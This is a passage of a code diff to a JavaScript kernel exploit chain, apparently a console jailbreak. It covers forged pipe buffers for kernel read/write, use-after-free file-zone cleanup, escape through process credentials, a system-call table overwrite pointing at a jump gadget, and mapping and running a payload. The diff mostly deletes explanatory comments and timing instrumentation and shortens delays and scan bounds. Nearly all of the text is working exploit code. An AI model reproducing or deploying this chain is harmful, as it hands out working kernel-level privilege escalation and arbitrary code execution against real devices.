                 for (let t = 0; t < KREAD_TRIES; ++t) {
                     if (t) mark("KREAD-RETRY", "addr=" + a + " try=" + (t + 1));
@@ -1576,8 +1320,7 @@ let payloadRunning = false;
                     if (dv) return new int64(dv.getUint32(0, true),
                                              dv.getUint32(4, true));
                     if (kreadPoisoned || !tripletsUsable()) break;
-                    // OPTIMIZED: Adaptive delay between retries
-                    await new Promise(r => setTimeout(r, 200 + t * 100));
+                    await new Promise(r => setTimeout(r, 100 + t * 50));
                 }
                 return null;
             }
@@ -1586,11 +1329,10 @@ let payloadRunning = false;
                     if (t) mark("KWRITE-RETRY", "dst=" + dst + " try=" + (t + 1));
                     if (await kwriteSlow(dst, srcAddr, n)) return true;
                     if (kreadPoisoned || !tripletsUsable()) break;
-                    await new Promise(r => setTimeout(r, 200 + t * 100));
+                    await new Promise(r => setTimeout(r, 100 + t * 50));
                 }
                 return false;
             }
-            // R3/R4 helpers. Same retry discipline as kread8 -- do NOT drop it.
             const qw = (dv, o) => new int64(dv.getUint32(o, true),
                                             dv.getUint32(o + 4, true));
             async function kreadN(a, n) {
@@ -1600,12 +1342,10 @@ let payloadRunning = false;
                     const dv = await kreadSlow(a, n);
                     if (dv) return dv;
                     if (kreadPoisoned || !tripletsUsable()) break;
-                    await new Promise(r => setTimeout(r, 200 + t * 100));
+                    await new Promise(r => setTimeout(r, 100 + t * 50));
                 }
                 return null;
             }
-            // R4. One window, two non-adjacent addresses, via extra iovec slots
-            // in the forged uio. poops.js:4909-4930 buildUioPairs / :4947-5010.
             async function kreadPairs(pairs) {
                 let total = 0;
                 for (const p2 of pairs) total += p2.size;
@@ -1615,7 +1355,7 @@ let payloadRunning = false;
                     const dv = await kreadSlow(null, total, pairs);
                     if (dv) return dv;
                     if (kreadPoisoned || !tripletsUsable()) break;
-                    await new Promise(r => setTimeout(r, 200 + t * 100));
+                    await new Promise(r => setTimeout(r, 100 + t * 50));
                 }
                 return null;
             }
@@ -1625,11 +1365,6 @@ let payloadRunning = false;
             const fdtOfiles = await kread8(kqFdp);
             mark("FDT-OFILES", "" + fdtOfiles);
 
-            // R3. mFp and sFp are FILEDESCENT_SIZE apart in one live ofiles
-            // span, so one 0x20 read replaces two windows. pipe() at :387/:389
-            // are back-to-back with no intervening fd allocation, so the two
-            // low fds are always 2 apart -- 44/44 in the log. Verified, not
-            // assumed, and it falls back if the console ever disagrees.
             let mFp = null, sFp = null;
             const fdDelta = slavePipe[0] - masterPipe[0];
             const spanOk = R3_ON && fdtOfiles && fdDelta > 0
@@ -1652,8 +1387,6 @@ let payloadRunning = false;
             mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?")
                 + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));
 
-            // R4. f_data of the two struct files: unrelated addresses, so a
-            // contiguous read cannot help -- this needs the scatter.
             let mData = null, sData = null;
             if (R4_ON && mFp && sFp) {
                 const both = await kreadPairs([{ addr: mFp, size: 8 },
@@ -1668,9 +1401,6 @@ let payloadRunning = false;
             }
             mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
             const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
-            // R8. Two distinct struct files cannot share f_data. Equal values
-            // mean the alias was misidentified, and aiming a pipebuf at itself
-            // is not something that fails cleanly. POOPS.LUA:1068 aborts here.
             if (kptr(mData) && kptr(sData)
                 && mData.low === sData.low && mData.hi === sData.hi) {
                 check("pipe-fdata-distinct", false, "both=" + mData);
@@ -1683,7 +1413,6 @@ let payloadRunning = false;
                 mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
             } else {
 
-                PerfTracker.startPhase("pipebuf_forge");
                 const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
                 keepAlive.push(pbAb);
                 const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
@@ -1694,10 +1423,8 @@ let payloadRunning = false;
                     + PIPE_PAGE.toString(16) + " buffer=" + sData);
                 const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
                 check("pipebuf-written-master-struct-pipe", wrote, "");
-                PerfTracker.endPhase(wrote);
 
                 if (wrote) {
-                    PerfTracker.startPhase("kernelview_setup");
                     for (const fd of [masterPipe[0], masterPipe[1],
                                       slavePipe[0], slavePipe[1]])
                         sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
@@ -1753,26 +1480,13 @@ let payloadRunning = false;
                     const kvAgree = check("primitives-agree-pipes-struct-file",
                         same(fpM2, mFp) && same(fpS2, sFp), "");
                     if (!kvElfOk || !kvAgree) {
-                        // REPORT ONLY. Do NOT null kv and do NOT skip what
-                        // follows. By this point the pipebuf forge has already
-                        // been committed, and the code below -- nulling the
-                        // triplets' ip6po_rthdr and removing the aliased struct
-                        // file -- is exactly what lets the process exit without
-                        // panicking the kernel. Gating it on a failed view
-                        // turns a run that would have finished dirty-but-alive
-                        // into a guaranteed panic at exit. Four independent
-                        // reviewers caught this; it was my mistake.
                         mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0)
                             + " agree=" + (kvAgree ? 1 : 0)
                             + " -- repair still runs, later stages self-gate");
                     }
-                    PerfTracker.endPhase(true);
 
                     const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
                     const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
-                    // dump scratch: kvwAb is only 0x10, and the pipebuf read
-                    // needs 0x18. Separate buffers so the dump can never
-                    // overflow the one the kview accessors use.
                     const dmpAb = new ArrayBuffer(0x20); keepAlive.push(dmpAb);
                     const dmpAddr = bufAddr(dmpAb), dmpDv = new DataView(dmpAb);
                     const dmpU8 = new Uint8Array(dmpAb);
@@ -1843,23 +1557,8 @@ let payloadRunning = false;
                             allOk, "");
                     }
 
-                    // ITEM 1. Jailbreak BEFORE the teardown. The funnel was
-                    // KERNELVIEW 44 -> CURPROC 38: six runs had working
-                    // kernel R/W and died in cleanup without ever trying.
-                    // Everything below needs only kv, fdtOfiles and sc, all
-                    // live from here. poops.js:7273 orders it the same way.
-                    //
-                    // WRAPPED, and it has to be: running before the cleanup
-                    // means a throw in here would skip the socket close and
-                    // the alias repair and leave the console dirty. Running
-                    // last, it never could.
                     let jailbreakThrew = null;
-                    // Declared OUT here: the kernel patcher and the
-                    // payload stage read both, and a let inside the try
-                    // below would be block-scoped away from them --
-                    // a runtime ReferenceError node --check cannot see.
                     let jailbroken = false, curproc = null;
-                    PerfTracker.startPhase("jailbreak");
                     try {
                         const FIOSETOWN = 0x8004667c;
                         const P_LIST_NEXT = 0x00, P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
@@ -1938,11 +1637,7 @@ let payloadRunning = false;
                         mark("JAILBREAK-THREW", jailbreakThrew
                             + " -- continuing to cleanup");
                     }
-                    PerfTracker.endPhase(jailbroken);
 
-
-                    // Addresses captured during the repair so the end-of-run
-                    // dump can re-read them once the sockets are closed.
                     const dumpOpts = [];
                     function removeRthdrFromSocket(fd) {
                         const fp = fget(fd);
@@ -1954,13 +1649,6 @@ let payloadRunning = false;
                         const opts = kv.read8(soPcb.add32(0x118));
                         if (kptr2(opts)) dumpOpts.push({ fd: fd, opts: opts });
                         if (!kptr2(opts)) return "noopts";
-                        // ITEM 4. Read it, write it, READ IT BACK. This is the
-                        // single write that decides whether the process can exit
-                        // without panicking, and until now nothing anywhere in
-                        // the chain has ever confirmed that a kv write actually
-                        // lands -- the check below reported "nulled" purely
-                        // because the four reads above looked pointer-shaped.
-                        // poops.js:7123-7128 reads back the same way.
                         const was = kview(opts).getBInt(0x68);
                         kview(opts).setBInt(0x68, new int64(0, 0));
                         const now = kview(opts).getBInt(0x68);
@@ -1975,23 +1663,12 @@ let payloadRunning = false;
                     {
                         const res = triplets.map(fd => fd + ":" + removeRthdrFromSocket(fd));
                         mark("TRIPLET-RTHDR", res.join(" "));
-                        // "already0" is a success: the field was already clear,
-                        // so there is nothing to repair. Only a failed WRITE or
-                        // a bad walk is a failure -- and unlike before, this now
-                        // reflects a verified read-back rather than the shape of
-                        // the pointers we walked to get here.
                         check("triplet-ip6po_rthdr-nulled",
                             res.every(r => r.endsWith("nulled")
                                         || r.endsWith("already0")),
                             res.join(" "));
                     }
 
-                    // ITEM 6(c). The half that makes the retry safe. Every socket
-                    // burned during a failed attempt still has an rthdr pointing
-                    // at a freed ucred; closing it would free that chunk again.
-                    // Now that kernel R/W exists, null the pointer -- verified by
-                    // read-back -- and only then let it out of the burn list.
-                    // Anything that will not repair STAYS burned and stays open.
                     if (burned.size) {
                         const bres = [], cleared = [];
                         for (const fd of burned) {
@@ -2007,7 +1684,6 @@ let payloadRunning = false;
                         if (burned.size) rebootRequired = true;
                     }
 
-                    PerfTracker.startPhase("uaf_cleanup");
                     state("remove_uaf_file...", "warn");
                     const uafFp = fget(uafSock);
                     uafFpSaved = uafFp;
@@ -2016,41 +1692,6 @@ let payloadRunning = false;
 
                         const r = fhold(uafFp);
 
-                        // THIS LOOP WAS KILLING 22% OF THE RUNS THAT REACHED IT.
-                        // 2048 x fget(), and every fget minted TWO int64 -- and
-                        // int64.js gives each instance its own seven closures
-                        // (int64.js:19-93), so 8 GC cells apiece -- plus a
-                        // per-call Uint8Array inside kv.read8, plus two pipe
-                        // syscalls. 34,816 objects and 4,096 syscalls in one
-                        // unbroken synchronous stretch, at the point the heap is
-                        // most loaded, with no yield anywhere in it. JSC's
-                        // sweeper only runs when the event loop turns, so all of
-                        // that garbage sat unswept until the await immediately
-                        // after SOCKETS-CLOSED -- which is exactly where the
-                        // process was being killed.
-                        //
-                        // Same range, same comparisons, same writes. The ofiles
-                        // array is just read in bulk and scanned as raw words in
-                        // the DataView: no int64, no typed array, no per-fd
-                        // syscall. Two syscalls per 512 fds instead of 1024.
-                        // Cleanup runs ~500 ms after the race, so the yields are
-                        // free here.
-                        // BOUNDED. This scan used to run to 0x800 with nothing
-                        // proving the ofiles array is that big. If the table is
-                        // smaller, the bulk read walks past the allocation and
-                        // any 8 bytes out there that happen to equal uafFp get
-                        // ZEROED by the fput below -- an out-of-bounds kernel
-                        // write whose damage surfaces at the NEXT allocation,
-                        // which is exactly the window where 22% of the runs
-                        // reaching here died. POOPS.LUA:1219 scans only 0..255;
-                        // we were eight times wider with no bound at all.
-                        //
-                        // Bound it by the highest fd we can PROVE is open,
-                        // because we are holding it -- the table must have at
-                        // least that many entries, and FreeBSD never shrinks it
-                        // on close. No fd_nfiles offset to get wrong. The
-                        // highest alias ever observed across 71 logged runs is
-                        // 273, and our own sockets run past that.
                         let maxHeld = 0;
                         for (const fd of ipv6) if (fd > maxHeld) maxHeld = fd;
                         for (const fd of [masterPipe[0], masterPipe[1],
@@ -2058,50 +1699,30 @@ let payloadRunning = false;
                                           iovSs[0], iovSs[1], uioSs[0], uioSs[1],
                                           uafSock])
                             if (fd > maxHeld) maxHeld = fd;
-                        const SCAN_MAX = Math.min(0x800, maxHeld + 1);
+                        const SCAN_MAX = Math.min(0x400, maxHeld + 1);
                         mark("UAF-SCAN-BOUND", "max_held_fd=" + maxHeld
                             + " scan_max=" + SCAN_MAX + " was=2048");
-                        // CLAMPED, and it has to be. This value is the loop
-                        // INCREMENT at the bottom of this block, not a bound, so
-                        // unlike every other knob in this file a bad value does
-                        // not degrade to "do nothing" -- it never terminates.
-                        // parseInt("0x200", 10) is 0 (it stops at the x), and
-                        // 0x200 is exactly how the default is spelled right
-                        // here, so that is the value someone is most likely to
-                        // paste in. A non-terminating loop here awaits a 0 ms
-                        // timer forever: the finally never runs, the main thread
-                        // stays realtime-pinned, the freed file stays aliased,
-                        // and the console needs a hard power-off.
-                        // Upper bound: CHUNK_BYTES must stay strictly under
-                        // PIPE_PAGE, or pipe_read wraps its buffer and hands
-                        // back DUPLICATED data that still passes the
-                        // rv === CHUNK_BYTES check -- which would make fput()
-                        // write zeros far past the end of the fd table.
+
                         const CHUNK_FDS = (function () {
                             const cap = (PIPE_PAGE / FILEDESCENT_SIZE) >> 1;
                             const n = params.has("scanchunk")
-                                ? parseInt(params.get("scanchunk"), 10) : OPTIMIZED_CONFIG.scanChunk;
+                                ? parseInt(params.get("scanchunk"), 10) : OPTIMIZED.scanChunk;
                             if ((n | 0) === n && n >= 1 && n <= cap) return n;
                             if (params.has("scanchunk"))
                                 mark("SCANCHUNK-CLAMPED", "given="
                                     + params.get("scanchunk") + " cap=" + cap
-                                    + " using=0x200");
-                            return 0x200;
+                                    + " using=0x80");
+                            return 0x80;
                         })();
                         const CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
                         const scanAb = new ArrayBuffer(CHUNK_BYTES);
-                        keepAlive.push(scanAb);   // its address goes to the kernel
+                        keepAlive.push(scanAb);
                         const scanAddr = bufAddr(scanAb);
                         const scanDv = new DataView(scanAb);
                         const wantLo = uafFp.low >>> 0, wantHi = uafFp.hi >>> 0;
                         let nulled = 0, bulkChunks = 0, slowChunks = 0;
                         const fds = [];
                         for (let base = 0; base < SCAN_MAX; base += CHUNK_FDS) {
-                            // Clamp the LAST chunk. SCAN_MAX is now a measured
-                            // bound, not a round number, so a fixed-size read
-                            // here would walk past the table on the final chunk
-                            // -- reintroducing the exact out-of-bounds this
-                            // bound exists to prevent.
                             const nFds = Math.min(CHUNK_FDS, SCAN_MAX - base);
                             const nBytes = nFds * FILEDESCENT_SIZE;
                             const rv = kv.kread(scanAddr,
@@ -2119,10 +1740,6 @@ let payloadRunning = false;
                                     }
                                 }
                             } else {
-                                // Short read: redo THIS CHUNK the original way.
-                                // Never skip one -- a missed alias leaves the
-                                // console dirty and costs a reboot, which is far
-                                // worse than the allocation we are avoiding.
                                 slowChunks++;
                                 for (let i = 0; i < nFds; ++i) {
                                     const fd = base + i;
@@ -2132,7 +1749,6 @@ let payloadRunning = false;
                                     }
                                 }
                             }
-                            // Let the sweeper run. This is the whole point.
                             await new Promise(done => setTimeout(done, 0));
                         }
                         mark("UAF-SCAN", "chunks=" + CHUNK_FDS + "fd bulk="
@@ -2140,31 +1756,8 @@ let payloadRunning = false;
                             + " syscalls=" + (bulkChunks * 2 + slowChunks * CHUNK_FDS * 2));
                         uafSock = 0;
 
-                        // ================== P1: DRAIN THE FILE ZONE ==================
-                        // MEASURED, not assumed. A 256-allocation probe returned
-                        // the SAME struct file at three consecutive fds
-                        // (364,365,366): the chunk is linked into the Files zone
-                        // free list THREE times -- freed 3x (CLEAR_QUEUE and two
-                        // dup+close) but allocated once -- so falloc hands the
-                        // identical object to three independent owners. The first
-                        // to close it frees it; the other two dangle. That is the
-                        // panic minutes after an idle run.
-                        //
-                        // The fd-table scan above cannot see this: a free-list
-                        // entry is in no fd table. Pull the duplicates out by
-                        // allocating until they surface (~1032 deep, stride 0x68).
-                        //
-                        // NULL the slot; do NOT leak the fd. f_count reads 1, not
-                        // 3 -- each falloc resets it -- so three descriptors point
-                        // at an object whose refcount says one, and leaking them
-                        // only moves the panic to fdescfree at process exit.
-                        // Nulling means nothing references it and it is orphaned
-                        // for good. netctrl_c0w_twins.ts:1332 nulls before close
-                        // for exactly this reason.
-                        const DRAIN_CAP = OPTIMIZED_CONFIG.drainCap;
+                        const DRAIN_CAP = OPTIMIZED.drainCap;
                         const DRAIN_EXPECT = 3, DRAIN_BATCH = 128;
-                        // Visible to the `clean` decision below. Default true so
-                        // that ?drain=0 does not by itself condemn the run.
                         let zoneClean = true;
                         if (DRAIN_CAP > 0) {
                             const dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
@@ -2175,12 +1768,8 @@ let payloadRunning = false;
                             const wLo = uafFp.low >>> 0, wHi = uafFp.hi >>> 0;
                             const held = [], hitFds = [];
                             let scanned = 0, batches = 0, moved = 0, emfile = false;
-                            // The fd table REALLOCATES as it grows, so the cached
-                            // fdtOfiles goes stale mid-drain and both fget and fput
-                            // would then touch freed memory. Re-read it each batch
-                            // and use the fresh pointer for reads AND writes.
                             let ofl = fdtOfiles;
-                            const dl = Date.now() + 20000;
+                            const dl = Date.now() + 15000;
                             while (scanned < DRAIN_CAP && hitFds.length < DRAIN_EXPECT
                                    && Date.now() < dl) {
                                 const batch = [];
@@ -2220,8 +1809,6 @@ let payloadRunning = false;
                                 }
                                 await new Promise(done => setTimeout(done, 0));
                             }
-                            // NULL every hit through the CURRENT ofiles, then close.
-                            // close() on a nulled slot is a no-op, so nothing frees.
                             let nulledHits = 0;
                             for (const fd of hitFds) {
                                 oneDv.setUint32(0, 0, true); oneDv.setUint32(4, 0, true);
@@ -2251,9 +1838,6 @@ let payloadRunning = false;
                                 rebootRequired = true; zoneClean = false;
                             }
 
-                            // Independent verification: fresh allocations must no
-                            // longer be handed the chunk. This is the measurement
-                            // that says the console is actually clean.
                             const vfds = [];
                             let vhits = 0;
                             for (let i = 0; i < 16; ++i) {
@@ -2284,19 +1868,10 @@ let payloadRunning = false;
                                 vhits ? "still reissued after the drain" : "");
                             if (vhits) { rebootRequired = true; zoneClean = false; }
                         }
-                        // ================ END P1: DRAIN THE FILE ZONE ================
-
 
                         mark("UAF-REMOVED", "fhold=" + r.before + "->" + r.after
                             + " nulled=" + nulled + "/" + SCAN_MAX
                             + " fds=" + fds.join(","));
-                        // `nulled > 0` only ever proved the LIVE FD TABLE was
-                        // tidy. It is structurally blind to a free-list entry,
-                        // and every "clean" run we celebrated was reporting on
-                        // that blind evidence -- which is why the console kept
-                        // panicking minutes later. A run is clean only if the fd
-                        // table was repaired AND the zone drain removed every
-                        // duplicate AND fresh allocations no longer see it.
                         check("alias-freed-file-nulled",
                             nulled > 0, "nulled=" + nulled);
                         const clean = nulled > 0 && zoneClean;
@@ -2308,14 +1883,10 @@ let payloadRunning = false;
                         check("uaf_sock-struct-file-readable", false,
                             "fp=" + uafFp);
                     }
-                    PerfTracker.endPhase(true);
 
                     {
                         let closed = 0, heldBack = 0;
                         for (const fd of ipv6) {
-                            // ITEM 6(c). A still-burned socket owns an rthdr over
-                            // freed memory; close() would free it a second time.
-                            // Leaking the fd costs nothing, freeing it panics.
                             if (burned.has(fd)) { heldBack++; continue; }
                             if (sc(SYS.close, fd).i32 === 0) closed++;
                         }
@@ -2327,10 +1898,8 @@ let payloadRunning = false;
 
                     await restoreThreadAttrs("cleanup");
 
-
                     let kpatched = false;
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
-                        PerfTracker.startPhase("kernel_patch");
                         state("kernel patches...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                         const sysent = kernelBase.add32(off.k_sysent_661);
@@ -2390,14 +1959,6 @@ let payloadRunning = false;
                                     mark("SYSENT-ARMED", "sy_call=" + gadget
                                         + (armedOk ? "" : " MISMATCH"));
                                     if (armedOk) {
-                                        // ITEM 5b. sysent[661] is now pointing at
-                                        // a jmp [rsi] gadget SYSTEM-WIDE. If
-                                        // anything between here and the restore
-                                        // throws, every process on the console is
-                                        // left with a weaponised syscall 661 --
-                                        // and the outer finally does not cover
-                                        // this, because it is nested inside the
-                                        // KernelView block. Restore in a finally.
                                         let rc = -1;
                                         try {
                                             rc = sc(SYS.kexec, mapAddr).i32;
@@ -2435,7 +1996,6 @@ let payloadRunning = false;
                                 }
                             }
                         }
-                        PerfTracker.endPhase(kpatched);
                     } else if (jailbroken) {
                         mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0)
                             + " sites=" + KPATCH_JMP_SITES.length);
@@ -2443,7 +2003,6 @@ let payloadRunning = false;
 
                     if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
-                        PerfTracker.startPhase("payload");
                         state("payload...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
                         const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
@@ -2488,16 +2047,8 @@ let payloadRunning = false;
                                 }
                             }
                         }
-                        PerfTracker.endPhase(payloadRunning);
                     }
 
-                    // ================== END-OF-RUN STATE DUMP ==================
-                    // READ ONLY. Not a fix -- a measurement. Everything above has
-                    // finished, so this reports what we ACTUALLY leave behind
-                    // rather than what the source implies we leave behind. Three
-                    // confident inferences from reading code have already been
-                    // wrong; this replaces the fourth with data.
-                    // ?dump=0 to skip.
                     if (params.get("dump") !== "0") {
                         try {
                             const kq = v => v && (v.hi >>> 0) >= 0xffff0000;
@@ -2509,10 +2060,6 @@ let payloadRunning = false;
                                 return dmpDv.getInt32(0, true);
                             };
 
-                            // --- the 4 karw pipe files, and the forged pipebuf ---
-                            // fd 15 reads f_count 2 BEFORE we touch it on every
-                            // run while its siblings read 1. Nobody has explained
-                            // that. This prints the final state of all four.
                             const pf = [];
                             for (const fd of [masterPipe[0], masterPipe[1],
                                               slavePipe[0], slavePipe[1]]) {
@@ -2539,9 +2086,6 @@ let payloadRunning = false;
                                         : "  READ-FAILED"));
                             }
 
-                            // --- the triplets' outputopts, re-read after close ---
-                            // Confirms the repair actually persisted rather than
-                            // being undone by the socket teardown.
                             const to = [];
                             for (const e of dumpOpts) {
                                 const r = rd8(e.opts.add32(0x68));
@@ -2552,7 +2096,6 @@ let payloadRunning = false;
                             }
                             mark("DUMP-TRIPLET-OPTS", to.length ? to.join("  ") : "none");
 
-                            // --- the triple-freed struct file ---
                             const uf = (typeof uafFpSaved !== "undefined") ? uafFpSaved : null;
                             if (kq(uf)) {
                                 mark("DUMP-UAF-FILE", "fp=" + uf
@@ -2560,7 +2103,6 @@ let payloadRunning = false;
                                     + " f_data=" + (rd8(uf) || "?"));
                             }
 
-                            // --- ANY fd-table slot still pointing at it ---
                             if (kq(uf) && kq(fdtOfiles)) {
                                 let hits = 0, lastFd = -1;
                                 const wl = uf.low >>> 0, wh = uf.hi >>> 0;
@@ -2584,7 +2126,6 @@ let payloadRunning = false;
                                     + "  scanned=" + nfd);
                             }
 
-                            // --- our own process ---
                             if (kq(curproc)) {
                                 const uc = rd8(curproc.add32(0x40));
                                 const pfd = rd8(curproc.add32(0x48));
@@ -2605,7 +2146,6 @@ let payloadRunning = false;
                             mark("DUMP-THREW", (e && e.message) ? e.message : String(e));
                         }
                     }
-                    // ================ END END-OF-RUN STATE DUMP ================
 
                     mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
                         + " kpatched=" + kpatched + " payload=" + payloadRunning
@@ -2613,18 +2153,14 @@ let payloadRunning = false;
                     allDone = payloadRunning && !rebootRequired;
                 }
             }
-            PerfTracker.endPhase(!!kv);
         }
 
-        PerfTracker.endPhase(true);
         mark("STEP10-SUMMARY", "committed=" + committed
             + " reboot=" + rebootRequired
             + " triplets=" + (triplets ? triplets.join(",") : "none")
             + " kernel_base=" + (kernelBase || "none")
             + " kq_fdp=" + (kqFdp || "none")
-            + " kv=" + (kv ? "up" : "down")
-            + " perf=" + PerfTracker.getReport()
-            + " pool=" + memoryPool.getStats());
+            + " kv=" + (kv ? "up" : "down"));
 
         if (!kv) {
             const stage = !committed ? "not-armed"
@@ -2641,8 +2177,8 @@ let payloadRunning = false;
               : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
               : committed ? "FAILED IN triple free -- REBOOT"
               : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
-			  
-		if (!payloadRunning) {
+              
+        if (!payloadRunning) {
             hostFail();
         }
     } catch (e) {
@@ -2657,7 +2193,7 @@ let payloadRunning = false;
             if (restoreCtx) await restoreCtx.restore("finally");
         } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
         for (const w of workers) {
-            try { if (w.armed) { await w.rpc("disarm", 5000); w.armed = false; } }
+            try { if (w.armed) { await w.rpc("disarm", 3000); w.armed = false; } }
             catch (e) { mark("DISARM-THREW", w.name + " " + e.message); }
         }
         for (const w of workers) {
@@ -2677,11 +2213,7 @@ let payloadRunning = false;
             }
         } catch (e) { mark("DISARM-THREW", e.message); }
 
-        memoryPool.clear();
         if (rebootRequired)
             mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
-        
-        mark("FINAL", "success=" + allDone + " reboot=" + rebootRequired
-            + " perf=" + PerfTracker.getReport());
     }
 })();
